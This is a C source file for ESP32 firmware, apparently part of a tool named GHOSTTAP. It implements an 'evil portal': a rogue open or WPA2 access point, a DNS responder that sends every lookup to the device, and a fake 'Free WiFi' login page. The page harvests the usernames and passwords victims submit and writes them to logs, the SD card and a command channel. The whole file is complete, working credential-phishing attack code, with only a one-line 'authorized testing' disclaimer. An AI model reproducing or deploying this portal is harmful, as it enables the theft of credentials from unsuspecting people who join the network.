/*
 * GHOSTTAP evil portal — SoftAP + DNS spoof + HTTP captive portal.
 *
 * Flow:
 *   1. WiFi is (re)started in AP mode with the given SSID/pass.
 *   2. A UDP responder on :53 answers every A query with the AP IP.
 *   3. esp_http_server on :80 serves the portal page for any GET and
 *      captures credentials from POST /login.
 *
 * Captured credentials are kept in RAM for the UI and appended to the
 * SD session log via sd_log_write().
 *
 * This firmware is for authorized security testing only.
 */
#include <string.h>
#include <stdlib.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "lwip/sockets.h"
#include "lwip/inet.h"

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_netif_ip_addr.h"
#include "esp_http_server.h"

#include "cmd.h"
#include "modules/evil_portal.h"
#include "modules/wifi_scan.h"
#include "modules/sd_log.h"

static const char *TAG = "evil_portal";

static bool           s_running;
static bool           s_dns_running;
static int            s_dns_sock = -1;
static esp_netif_t   *s_ap_netif;
static httpd_handle_t s_server;

static uint32_t       s_attempts;
static char           s_last_user[48];
static char           s_last_pass[48];

static uint32_t       s_ap_ip;      /* network order */

/* ---- portal page ---------------------------------------------------- */
static const char PAGE_INDEX[] =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>WiFi Login</title>"
    "<style>"
    "body{font-family:sans-serif;background:#0e1621;color:#e6edf3;"
    "display:flex;min-height:100vh;margin:0;align-items:center;justify-content:center}"
    ".card{background:#161f2b;border:1px solid #2d3a4a;border-radius:10px;"
    "padding:28px;width:300px;text-align:center}"
    "h2{color:#7fd4ff;margin-top:0}input{display:block;width:92%;margin:10px auto;"
    "padding:10px;border:1px solid #2d3a4a;border-radius:6px;background:#0e1621;"
    "color:#e6edf3}button{width:100%;padding:11px;margin-top:8px;border:0;"
    "border-radius:6px;background:#1f7dbb;color:#fff;font-size:15px}"
    "p{font-size:12px;color:#8aa0b4}"
    "</style></head><body>"
    "<div class=\"card\"><h2>Free WiFi</h2>"
    "<p>Sign in to use this network</p>"
    "<form method=\"POST\" action=\"/login\">"
    "<input type=\"text\" name=\"username\" placeholder=\"Username\" autocomplete=\"off\" autofocus>"
    "<input type=\"password\" name=\"password\" placeholder=\"Password\">"
    "<button type=\"submit\">Connect</button>"
    "</form></div></body></html>";

static const char PAGE_DONE[] =
    "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
    "<title>Connected</title>"
    "<style>body{font-family:sans-serif;background:#0e1621;color:#e6edf3;"
    "display:flex;min-height:100vh;margin:0;align-items:center;justify-content:center}"
    "</style></head><body><h2>Connected</h2></body></html>";

/* ---- URL-decode a single form field -------------------------------- */
static int form_field(const char *body, const char *key, char *out, size_t outsz)
{
    size_t klen = strlen(key);
    const char *p = body;
    while ((p = strstr(p, key)) != NULL) {
        if ((p == body || p[-1] == '&') && p[klen] == '=') {
            p += klen + 1;
            size_t o = 0;
            while (*p && *p != '&' && o + 1 < outsz) {
                if (*p == '%' && p[1] && p[2]) {
                    char hex[3] = { p[1], p[2], 0 };
                    out[o++] = (char)strtol(hex, NULL, 16);
                    p += 3;
                } else {
                    out[o++] = (*p == '+') ? ' ' : *p;
                    p++;
                }
            }
            out[o] = 0;
            return 1;
        }
        p++;
    }
    out[0] = 0;
    return 0;
}

/* ---- HTTP handlers -------------------------------------------------- */
static esp_err_t h_index(httpd_req_t *req)
{
    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, PAGE_INDEX, HTTPD_RESP_USE_STRLEN);
}

static esp_err_t h_login(httpd_req_t *req)
{
    char buf[512];
    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
    if (ret > 0) buf[ret] = 0;
    else buf[0] = 0;

    char user[48], pass[48];
    form_field(buf, "username", user, sizeof(user));
    form_field(buf, "password", pass, sizeof(pass));

    s_attempts++;
    snprintf(s_last_user, sizeof(s_last_user), "%s", user);
    snprintf(s_last_pass, sizeof(s_last_pass), "%s", pass);
    ESP_LOGI(TAG, "captured user='%s' pass='%s'", user, pass);
    sd_log_write("EVILPORTAL u=%s p=%s", user, pass);
    cmd_emit("CREDS %s %s", user, pass);

    httpd_resp_set_type(req, "text/html");
    return httpd_resp_send(req, PAGE_DONE, HTTPD_RESP_USE_STRLEN);
}

/* ---- DNS responder --------------------------------------------------- */
static void dns_task(void *arg)
{
    (void)arg;
    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s < 0) {
        s_dns_running = false;
        vTaskDelete(NULL);
        return;
    }
    s_dns_sock = s;
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(53);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(s);
        s_dns_sock = -1;
        s_dns_running = false;
        vTaskDelete(NULL);
        return;
    }

    uint8_t buf[512];
    while (s_dns_running) {
        struct sockaddr_in from;
        socklen_t flen = sizeof(from);
        ssize_t n = recvfrom(s, buf, sizeof(buf), 0,
                             (struct sockaddr *)&from, &flen);
        if (n < 12) continue;
        uint16_t flags = (uint16_t)((buf[2] << 8) | buf[3]);
        if (flags & 0x8000) continue;          /* not a query */

        /* walk the qname; find its end */
        int off = 12;
        while (off < n && buf[off]) {
            off += 1 + buf[off];
        }
        off += 1;                              /* skip terminating zero */
        if (off + 4 > n) continue;             /* need qtype + qclass */

        uint16_t qtype  = (uint16_t)((buf[off] << 8) | buf[off + 1]);
        uint16_t qclass = (uint16_t)((buf[off + 2] << 8) | buf[off + 3]);

        /* header: response, RA, 1 question (kept), answers below */
        buf[2] = 0x81;
        buf[3] = 0x80;
        buf[4] = 0x00; buf[5] = 0x01;          /* QDCOUNT */
        buf[6] = 0x00; buf[7] = 0x01;          /* ANCOUNT */
        buf[8] = 0x00; buf[9] = 0x00;          /* NSCOUNT */
        buf[10] = 0x00; buf[11] = 0x00;        /* ARCOUNT */

        int total = off;
        if (qtype == 0x01 && qclass == 0x01) {  /* A / IN */
            uint8_t *a = &buf[off];
            a[0] = 0xc0; a[1] = 0x0c;          /* pointer to qname */
            a[2] = 0x00; a[3] = 0x01;          /* type A */
            a[4] = 0x00; a[5] = 0x01;          /* class IN */
            a[6] = 0x00; a[7] = 0x00; a[8] = 0x00; a[9] = 0x3c; /* TTL 60 */
            a[10] = 0x00; a[11] = 0x04;        /* RDLENGTH 4 */
            memcpy(&a[12], &s_ap_ip, 4);
            total = off + 16;
        } else {
            buf[3] = 0x83;                     /* no answers */
        }

        sendto(s, buf, total, 0,
               (struct sockaddr *)&from, flen);
    }

    close(s);
    s_dns_sock = -1;
    vTaskDelete(NULL);
}

/* ---- radio mode ------------------------------------------------------- */
static esp_err_t radio_to_ap(const char *ssid, const char *pass)
{
    esp_wifi_stop();
    if (!s_ap_netif) {
        s_ap_netif = esp_netif_create_default_wifi_ap();
    }

    wifi_config_t cfg = { 0 };
    snprintf((char *)cfg.ap.ssid, sizeof(cfg.ap.ssid), "%s", ssid);
    cfg.ap.ssid_len = strlen(ssid);
    cfg.ap.channel = 6;
    cfg.ap.max_connection = 4;
    cfg.ap.authmode = (pass && pass[0]) ? WIFI_AUTH_WPA2_PSK : WIFI_AUTH_OPEN;
    if (cfg.ap.authmode != WIFI_AUTH_OPEN) {
        snprintf((char *)cfg.ap.password, sizeof(cfg.ap.password), "%s", pass);
    }

    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_config(WIFI_IF_AP, &cfg);
    esp_wifi_start();

    esp_netif_ip_info_t ip;
    if (esp_netif_get_ip_info(s_ap_netif, &ip) == ESP_OK) {
        s_ap_ip = ip.ip.addr;
        ESP_LOGI(TAG, "AP '%s' ip " IPSTR, ssid, IP2STR(&ip.ip));
    } else {
        s_ap_ip = 0;
    }
    return ESP_OK;
}

static void radio_back_to_sta(void)
{
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
}

/* ---- public API -------------------------------------------------------- */
esp_err_t evil_portal_start(const char *ap_ssid, const char *ap_pass)
{
    if (s_running) return ESP_ERR_INVALID_STATE;

    ESP_ERROR_CHECK(wifi_scan_init());   /* NVS / netif / event loop */
    radio_to_ap(ap_ssid, ap_pass);

    httpd_config_t hcfg = HTTPD_DEFAULT_CONFIG();
    hcfg.lru_purge_enable = true;
    hcfg.max_uri_handlers = 4;
    hcfg.stack_size = 4096;
    if (httpd_start(&s_server, &hcfg) != ESP_OK) {
        radio_back_to_sta();
        return ESP_ERR_INVALID_STATE;
    }

    static const httpd_uri_t uri_get = {
        .uri = "/*", .method = HTTP_GET, .handler = h_index,
        .user_ctx = NULL,
    };
    static const httpd_uri_t uri_post = {
        .uri = "/login", .method = HTTP_POST, .handler = h_login,
        .user_ctx = NULL,
    };
    httpd_register_uri_handler(s_server, &uri_get);
    httpd_register_uri_handler(s_server, &uri_post);

    s_dns_running = true;
    xTaskCreate(dns_task, "evdns", 2048, NULL, 5, NULL);

    s_attempts = 0;
    s_running = true;
    ESP_LOGI(TAG, "portal online");
    return ESP_OK;
}

void evil_portal_stop(void)
{
    if (!s_running) return;
    s_running = false;
    s_dns_running = false;
    if (s_server) {
        httpd_stop(s_server);
        s_server = NULL;
    }
    if (s_dns_sock >= 0) {
        close(s_dns_sock);             /* wake the blocked recvfrom */
        s_dns_sock = -1;
        vTaskDelay(pdMS_TO_TICKS(100)); /* let the dns task exit */
    }
    radio_back_to_sta();
    ESP_LOGI(TAG, "portal offline");
}

bool evil_portal_is_running(void) { return s_running; }

void evil_portal_get_last_creds(char *user, size_t ulen, char *pass, size_t plen)
{
    if (user && ulen) snprintf(user, ulen, "%s", s_last_user);
    if (pass && plen) snprintf(pass, plen, "%s", s_last_pass);
}

void evil_portal_get_stats(uint32_t *attempts)
{
    if (attempts) *attempts = s_attempts;
}
